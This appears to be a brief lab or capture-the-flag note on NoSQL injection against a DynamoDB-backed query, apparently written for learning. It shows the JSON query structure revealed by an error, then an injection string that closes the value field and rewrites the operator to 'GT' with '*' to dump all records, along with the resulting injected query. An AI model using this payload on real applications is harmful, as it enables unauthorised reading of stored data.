# DynamoDB nosql injection

![](./dynamo-nosql-normal.PNG)

Error shows the structure of the json query

![](./dynamo-nosql-error.PNG)

```json
{"Name": 
    {
        "ComparisonOperator": "EQ",
        "AttributeValueList": 
            [
                {
                    "S": " <USER INPUT> "
                }
            ]
    }
} 
```

Input `alice"}],"ComparisonOperator": "GT", "AttributeValueList":[{"S":"*`

![](./dynamo-nosql-dumpall.PNG)

Which inputs into below

```json
{"Name": 
    {
        "ComparisonOperator": "EQ",
        "AttributeValueList": 
            [
                {
                    "S": "   alice"}],"ComparisonOperator": "GT", "AttributeValueList":[{"S":"*   "
                }
            ]
    }
} 
```

